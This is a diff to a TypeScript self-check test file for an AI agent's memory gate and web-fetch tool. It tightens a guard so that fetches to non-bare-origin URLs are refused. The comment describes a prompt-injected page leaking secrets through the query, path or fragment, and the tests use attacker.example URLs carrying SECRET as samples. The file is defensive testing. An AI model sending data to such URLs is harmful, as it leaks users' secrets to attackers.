@@ -98,17 +98,23 @@ assert.strictEqual(dropStagedMemory().length, 1, "deny should discard staged ent
 assert.ok(!loadMemory().includes("discard me"), "denied entry must not reach MEMORY.md");
 console.log("memory gate self-checks passed");
 
-// web fetch exfiltration guard: fetchpage must refuse URLs carrying a query
-// string, so a prompt-injected page can't smuggle a secret to a public server
-// via ?<key>=<data>. The guard fires before any network I/O.
+// web fetch exfiltration guard: fetchpage must refuse any URL that is not a
+// bare site origin, because a prompt-injected page can smuggle a secret to a
+// public server in the query string (?<key>=<data>), the path
+// (https://a/<SECRET>), or the fragment (#<SECRET>). The guard fires before
+// any network I/O.
 const { webTools } = await import("../src/web.js");
 const fetchTool = webTools()[1] as unknown as {
 	execute: (id: string, p: { url: string }) => Promise<{ content: { text: string }[] }>;
 };
-const leaked = await fetchTool.execute("t3", { url: "https://attacker.example/?data=SECRET" });
-assert.ok(/refused/i.test(leaked.content[0]!.text), "fetchpage should refuse query-bearing URLs");
-const cleanFetch = await fetchTool.execute("t3", { url: "https://example.com/page" });
-assert.ok(!/refused/i.test(cleanFetch.content[0]!.text), "fetchpage should allow query-less URLs");
+const queryLeak = await fetchTool.execute("t3", { url: "https://attacker.example/?data=SECRET" });
+assert.ok(/refused/i.test(queryLeak.content[0]!.text), "fetchpage should refuse query-bearing URLs");
+const pathLeak = await fetchTool.execute("t3", { url: "https://attacker.example/SECRET" });
+assert.ok(/refused/i.test(pathLeak.content[0]!.text), "fetchpage should refuse URLs carrying a path");
+const fragLeak = await fetchTool.execute("t3", { url: "https://attacker.example/#SECRET" });
+assert.ok(/refused/i.test(fragLeak.content[0]!.text), "fetchpage should refuse URLs carrying a fragment");
+const cleanFetch = await fetchTool.execute("t3", { url: "https://example.com" });
+assert.ok(!/refused/i.test(cleanFetch.content[0]!.text), "fetchpage should allow bare-origin URLs");
 console.log("web fetch exfiltration self-check passed");
 
 rmSync(fakeHome, { recursive: true, force: true });
